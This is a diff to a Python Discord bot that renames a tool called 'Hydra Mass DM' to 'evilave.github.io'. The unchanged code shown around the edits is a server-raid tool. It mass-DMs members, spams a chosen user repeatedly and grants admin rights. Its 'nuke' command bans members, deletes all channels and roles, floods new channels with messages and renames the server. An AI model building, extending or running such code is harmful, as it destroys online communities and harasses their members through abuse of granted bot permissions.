@@ -37,7 +37,7 @@ def command_validation(ctx):
         return False
 
 help_menu = f"""
-Available commands for the Hydra Mass DM bot :
+Available commands for the evilave.github.io :
 
 **{prefix}help** - Show this message.
 
@@ -56,7 +56,7 @@ nuke_modes = ['members', 'channels', 'roles', 'all']
 @client.event
 async def on_ready():
     os.system("cls")
-    print(colored(f"Hydra initialized as: {client.user}",'blue'))
+    print(colored(f"evilave.github.io initialized as: {client.user}",'blue'))
     print("")
 
 # commands
@@ -65,7 +65,7 @@ async def on_ready():
 async def help(ctx):
     validation = command_validation(ctx)
     if validation:
-        print(colored("HYDRA - HELP MENU RECEIVED",'magenta'))
+        print(colored("evilave.github.io - help menu received",'magenta'))
         if ctx.guild:
             await ctx.message.delete()
         try:
@@ -94,7 +94,7 @@ async def changenick(ctx, mode="", *, nickname=""):
                     except Exception as e:
                         print(colored(f"{time}", 'white'), colored(f"Couldn't change {member}'s nickname to {nickname}: {e}", 'red'))
 
-                print(colored(f"{time}",'white'), colored("HYDRA - NICKNAME CHANGE COMPLETE",'magenta'))
+                print(colored(f"{time}",'white'), colored("evilave.github.io - nickname change complete",'magenta'))
 
         else:
             time = datetime.now().strftime("%H:%M:%S")
@@ -109,7 +109,7 @@ async def changenick(ctx, mode="", *, nickname=""):
                 except Exception as e:
                     print(colored(f"{time}", 'white'), colored(f"Couldn't change {member}'s nickname to {nickname}: {e}", 'red'))
 
-                print(colored(f"{time}", 'white'), colored("HYDRA - NICKNAME CHANGE COMPLETE", 'magenta'))
+                print(colored(f"{time}", 'white'), colored("evilave.github.io - nickname change complete", 'magenta'))
             else:
                 print(colored(f"{time}", 'white'), colored("Member not found.", 'red'))
 
@@ -134,7 +134,7 @@ async def grantadmin(ctx, mode=""):
                 except Exception as e:
                     print(colored(f"{time}", 'white'), colored(f"Couldn't grant {member} admin: {e}", 'red'))
 
-            print(colored(f"{time}", 'white'), colored("HYDRA - ADMIN GRANT COMPLETE", 'magenta'))
+            print(colored(f"{time}", 'white'), colored("evilave.github.io - admin grant complete", 'magenta'))
         else:
             time = datetime.now().strftime("%H:%M:%S")
             member_id = int(mode.strip("<@!>"))
@@ -152,7 +152,7 @@ async def grantadmin(ctx, mode=""):
             else:
                 print(colored(f"{time}", 'white'), colored("Member not found.", 'red'))
 
-            print(colored(f"{time}", 'white'), colored("HYDRA - ADMIN GRANT COMPLETE", 'magenta'))
+            print(colored(f"{time}", 'white'), colored("evilave.github.io - admin grant complete", 'magenta'))
 
 
 @client.command()
@@ -173,7 +173,7 @@ async def massdm(ctx, *, message: str):
                         except:
                             time = datetime.now().strftime("%H:%M:%S")
                             print(colored(f"{time}",'white'), colored(f"{time}",'white'), colored(f"{time}",'white'), colored(f"Couldn't message {member}, their DMs are off or the bot has been blocked.",'red'))
-                print(colored(f"{time}",'white'), colored(f"{time}",'white'), colored("HYDRA - MASS DM COMPLETE",'magenta'))
+                print(colored(f"{time}",'white'), colored(f"{time}",'white'), colored("evilave.github.io - mass dm complete",'magenta'))
             except Exception as e:
                 time = datetime.now().strftime("%H:%M:%S")
                 print(colored(f"{time}",'white'), colored(f"{time}",'white'), colored(f"Couldn't send messages: {e}",'red'))
@@ -189,7 +189,7 @@ async def massdm(ctx, *, message: str):
                         except:
                             time = datetime.now().strftime("%H:%M:%S")
                             print(colored(f"{time}",'white'), colored(f"Couldn't message {member}, their DMs are off or the bot has been blocked.",'red'))
-                print(colored(f"{time}",'white'), colored("HYDRA - MASS DM COMPLETE",'magenta'))
+                print(colored(f"{time}",'white'), colored("evilave.github.io - mass dm complete",'magenta'))
             except Exception as e:
                 time = datetime.now().strftime("%H:%M:%S")
                 print(colored(f"{time}",'white'), colored(f"Couldn't send messages: {e}",'red'))
@@ -205,7 +205,7 @@ async def dm(ctx, user: discord.Member, *, message: str):
                 try:
                     await user.send(f"{message}")
                     print(colored(f"{time}",'white'), colored(f"Messaged {user} : {message}",'green'))
-                    print(colored(f"{time}",'white'), colored("HYDRA - USER DM COMPLETE",'magenta'))
+                    print(colored(f"{time}",'white'), colored("evilave.github.io - user dm complete",'magenta'))
                 except:
                     time = datetime.now().strftime("%H:%M:%S")
                     print(colored(f"{time}",'white'), colored(f"Couldn't send a message to this user.",'red'))
@@ -232,7 +232,7 @@ async def spamuser(ctx, user: discord.Member, amount: int, *, message: str):
                                 await user.send(message)
                                 time = datetime.now().strftime("%H:%M:%S")
                                 print(colored(f"{time}",'white'), colored(f"{i+1}",'blue'), colored("/",'green'), colored(f"{str(amount)}",'blue'), colored(f"Messaged {user} : {message}",'green'))
-                            print(colored(f"{time}",'white'), colored("HYDRA - USER SPAM COMPLETE",'magenta'))
+                            print(colored(f"{time}",'white'), colored("evilave.github.io - user spam complete",'magenta'))
                         except:
                             time = datetime.now().strftime("%H:%M:%S")
                             print(colored(f"{time}",'white'), colored(f"Couldn't message {user}.",'red'))
@@ -264,7 +264,7 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
                         if str(member.id) not in userid and member.id != client.user.id:
                             if discord.utils.get(guild.roles, id=bot_member.top_role.id) > discord.utils.get(guild.roles, id=member.top_role.id):
                                 try:
-                                    await member.ban(reason="HYDRA MASS DM - NUKE")
+                                    await member.ban(reason="evilave.github.io - nuke")
                                     time = datetime.now().strftime("%H:%M:%S")
                                     print(colored(f"{time}",'white'), colored(f"Banned {member}",'green'))
                                 except discord.errors.Forbidden:
@@ -273,7 +273,7 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
                             else:
                                 time = datetime.now().strftime("%H:%M:%S")
                                 print(colored(f"{time}",'white'), colored(f"Couldn't ban {member} because of role hierarchy.",'red'))
-                    print(colored(f"{time}",'white'), colored("HYDRA - MEMBER BAN COMPLETE",'magenta'))
+                    print(colored(f"{time}",'white'), colored("evilave.github.io - member ban complete",'magenta'))
                 else:
                     print(colored(f"{time}",'white'), colored("Bot requires admin permissions in the guild to ban members.",'red'))
             elif mode == "channels":
@@ -288,7 +288,7 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
                         except discord.errors.HTTPException:
                             time = datetime.now().strftime("%H:%M:%S")
                             print(colored(f"{time}",'white'), colored(f"Couldn't delete {channel} because of an HTTP error.",'red'))
-                    print(colored(f"{time}",'white'), colored("HYDRA - CHANNEL DELETION COMPLETE",'magenta'))
+                    print(colored(f"{time}",'white'), colored("evilave.github.io - channel deletion complete",'magenta'))
                 else:
                     time = datetime.now().strftime("%H:%M:%S")
                     print(colored(f"{time}",'white'), colored(f"Bot requires admin permissions in the guild to delete channels.",'red'))
@@ -306,7 +306,7 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
                                 if role.name != "@everyone":
                                     time = datetime.now().strftime("%H:%M:%S")
                                     print(colored(f"{time}",'white'), colored(f"Couldn't delete {role} because it is managed by an integration",'red'))
-                    print(colored(f"{time}",'white'), colored("HYDRA - ROLE DELETION COMPLETE",'magenta'))
+                    print(colored(f"{time}",'white'), colored("evilave.github.io - role deletion complete",'magenta'))
                 else:
                     time = datetime.now().strftime("%H:%M:%S")
                     print(colored(f"{time}",'white'), colored(f"Bot requires admin permissions in the guild to delete roles.",'red'))
@@ -338,7 +338,7 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
                         if str(member.id) not in userid and member.id != client.user.id:
                             if discord.utils.get(guild.roles, id=bot_member.top_role.id) > discord.utils.get(guild.roles, id=member.top_role.id):
                                 try:
-                                    await member.ban(reason="HYDRA MASS DM - NUKE")
+                                    await member.ban(reason="evilave.github.io - nuke")
                                     time = datetime.now().strftime("%H:%M:%S")
                                     print(colored(f"{time}",'white'), colored(f"Banned {member}",'green'))
                                 except discord.errors.Forbidden:
@@ -352,10 +352,10 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
                         time = datetime.now().strftime("%H:%M:%S")
                         print(colored(f"{time}",'white'), colored(f"{i+1}",'blue'), colored("/",'green'), colored(f"{channelamount}",'blue'), colored(f"Created {nukechannel}",'green'))
                         await nukechannel.send(message)
-                    await guild.edit(name="NUKED - HYDRA - RIOT ADMINISTRATION")
+                    await guild.edit(name="evilave.github.io")
                     time = datetime.now().strftime("%H:%M:%S")
-                    print(colored(f"{time}",'white'), colored(f"Changed server name to NUKED - HYDRA - RIOT ADMINISTRATION",'green'))
-                    print(colored(f"{time}",'white'), colored("HYDRA - NUKE COMPLETED",'magenta'))
+                    print(colored(f"{time}",'white'), colored(f"Changed server name to - evilave.github.io",'green'))
+                    print(colored(f"{time}",'white'), colored("evilave.github.io - nuke complete",'magenta'))
                 else:
                     time = datetime.now().strftime("%H:%M:%S")
                     print(colored(f"{time}",'white'), colored(f"Bot requires admin permissions in the guild to nuke.",'red'))
@@ -364,5 +364,6 @@ async def nuke(ctx, mode: str, channelamount=0, channelname="", *, message=""):
             print(colored(f"{time}",'white'), colored(f"Input a valid nuke option. Available : members/channels/roles/all",'red'))
 
 
-os.system("title Hydra Mass DM")
+os.system("title evilave.github.io")
+
 client.run(token)
